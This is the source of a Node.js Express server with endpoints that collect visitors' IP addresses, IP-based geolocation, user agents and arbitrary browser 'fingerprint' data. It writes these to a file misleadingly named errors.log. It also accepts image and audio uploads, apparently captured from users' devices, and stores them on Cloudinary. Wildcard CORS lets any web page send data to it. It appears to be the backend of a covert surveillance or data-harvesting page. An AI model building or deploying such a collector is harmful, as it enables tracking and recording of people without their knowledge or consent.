const cloudinary = require('cloudinary').v2;
const express = require('express');
const fs = require('fs');
const path = require('path');
const geoip = require('geoip-lite');

cloudinary.config({
  cloud_name: process.env.CLOUD_NAME,
  api_key: process.env.API_KEY,
  api_secret: process.env.API_SECRET
});

const app = express();

// Optional: log errors locally (Render file system is temporary)
function initializeDirectories() {
  if (!fs.existsSync('data/errors.log')) {
    fs.mkdirSync('data', { recursive: true });
    fs.writeFileSync('data/errors.log', '');
  }
}
initializeDirectories();

app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header(
    'Access-Control-Allow-Headers',
    'Origin, X-Requested-With, Content-Type, Accept'
  );
  next();
});

function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
}

// Health check route
app.get('/', (req, res) => {
  res.send('Server is running');
});

// Fingerprint collection
app.post('/collect-fingerprint', (req, res) => {
  try {
    const fingerprint = {
      timestamp: new Date().toISOString(),
      ip: getClientIp(req),
      geo: geoip.lookup(getClientIp(req)),
      userAgent: req.headers['user-agent'],
      ...req.body
    };

    const log = `[${new Date().toISOString()}] ${JSON.stringify(fingerprint)}\n`;
    fs.appendFileSync('data/errors.log', log);

    res.sendStatus(200);
  } catch (err) {
    console.error('Fingerprint error:', err);
    res.status(500).send('Error saving fingerprint');
  }
});

// ✅ Cloudinary media upload
app.post('/collect-media', async (req, res) => {
  try {
    const { type, data, extension } = req.body;

    if (!['image', 'audio'].includes(type)) {
      return res.status(400).send('Invalid media type');
    }

    // Fix base64 format safely
    const uploadDataUri = data.startsWith('data:')
      ? data
      : `data:${type}/${extension};base64,${data}`;

    const result = await cloudinary.uploader.upload(uploadDataUri, {
      folder: `device-test/${type}`,
      resource_type: type === 'audio' ? 'video' : 'image' // Cloudinary treats audio as 'video'
    });

    console.log(`${type} uploaded:`, result.secure_url);
    res.sendStatus(200);
  } catch (err) {
    console.error('Media upload error:', err);
    res.status(500).send('Error uploading media');
  }
});

// Error log from frontend
app.post('/log-error', (req, res) => {
  try {
    console.error('Client error:', req.body.error);
    res.sendStatus(200);
  } catch (err) {
    console.error('Error logging failed:', err);
    res.status(500).send('Error logging error');
  }
});

// Use PORT from environment (Render)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
